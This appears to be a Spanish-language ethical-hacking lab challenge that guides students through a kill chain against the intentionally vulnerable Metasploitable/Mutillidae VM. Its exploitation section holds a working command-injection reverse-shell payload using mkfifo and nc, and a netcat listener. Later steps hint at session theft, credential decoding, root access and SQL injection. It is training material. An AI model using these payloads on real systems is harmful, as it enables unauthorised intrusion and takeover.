# Reto 1 CEH Interno

> Antes de iniciar, recuerda hacer prueba de red, debes tener alcance a la Metasplotable y a internet.

## Objetivo
### - Principal
¿Quien es el apellido de Jakub?
### - Militarizado
Controlar una forma de acceder a la informacion de Jakub

## 1. Reconocimiento (Recoonnaissance)
### - Research
- Jakub debe estar enlazado con Mutillidae
- Mutillidae ya fue explotado en login y con las cookies
- Reutiliza las pruebas anteriores hasta obtener mando y control
### - Reconocimiento del sistema
- Reconocimiento de red y script de vulnerabilidades RustScan
- Ingresa a Mutillidae en Metasploitable del Laboratorio http://metasploitable/mutillidae
- Reconoce los directorios con DirSearch

## 2. Militarizacion (Weaponization)
### - Estrategia
- Ciclo del error (Tabu): el sistemas utiliza versiones obsoletas y vulnerables
- Exceso de seguridad (Totem):  Se confia en que el usuario realizara la busqueda correcta de DNS en dns-lookup.php
	
### - Armamento 
- Prepara el exploit de acuerdo a la respuesta que acepte el servidor
- Netcat tiene una version obsoleta, algunos trucos pueden ayudarte

## 3. Entrega (Delivery)
- login.php
- dns.lookup.php
- Prepara la recepcion en tu kali con
	nc -lvnp 1234
		
## Explotacion:
- Ingresa en la entrega dns-lookup.php
	&& rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc metasploitable 1234 >/tmp/f
- Obten un shell interactivo utilizando python.
	$ python -c 'import pty; pty.spawn("/bin/bash")'
- Busca algun dato sobre Jakub en la carpeta.
- Consigue el apellido haciendo Dorking, tendras el objetivo.
	
## Instalación:
- No se puede ejecutar nada desde www-data.
- Busca un archivo que te permita robar alguna sesion del servidor.
	** Quiza las siglas del equipo donde jugo su final de Champions ayude.
- Obtener la clave cifrada y prueba en CyberChef de github
	** Base64 / Hex / Base64
- Ingresa a msfadmin con:
	$ sudo 'usuario encontrado'
- Y la contraseña para tener acceso, nos instalaremos aqui, no generamos backdoor.
	
## Comando & Control:
- Salir de la sesion.
- Ingresa en la cuenta con las credenciales de SSH, y prueba el acceso a root.
		
## Acciones en el objetivo:
- En lista las versiones vulnerables que validaste en la entrega, y prepara los exploits.
- Si el login.php es vulnerable a SQL Injection, el login de user-info lo será? Qué obtenemos?

## Referencias

### Conocimientos de Ethical Hacking
* **[Robo de Sesiones (Session Hijacking)](https://github.com/heanczko311299/CEH/blob/main/11/README.md)**

### Pruebas de seguridad aplicativa 
* **OWASP10.2017 / A1 - Injection Command** 
* **OWASP10.2017 / A6- Security Misconfiguration**

### Pruebas de Penetración
* **[CyberKillChain](https://github.com/heanczko311299/githack/tree/main/Metodologias/CyberKillChain/README.md)**

h4Ppy #@cK1n6 :)
